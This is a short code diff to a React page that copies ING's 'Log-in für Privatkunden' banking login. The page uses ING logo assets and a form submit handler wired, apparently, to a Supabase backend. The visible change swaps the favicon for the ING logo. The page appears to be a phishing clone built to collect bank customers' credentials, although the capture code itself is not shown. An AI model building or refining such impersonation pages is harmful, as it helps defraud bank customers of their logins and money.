@@ -3,7 +3,6 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import faviconAsset from "@/assets/favicons/ing.webp.asset.json";
 import logoAsset from "@/assets/ing-logo.svg.asset.json";
 import QRCode from "react-qr-code";
 import youtubeAsset from "@/assets/youtube.svg.asset.json";
@@ -53,7 +52,7 @@ const ING = () => {
     window.scrollTo(0, 0);
   }, []);
 
-  usePageMeta("Log-in für Privatkunden – ING", faviconAsset.url);
+  usePageMeta("Log-in für Privatkunden – ING", logoAsset.url);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
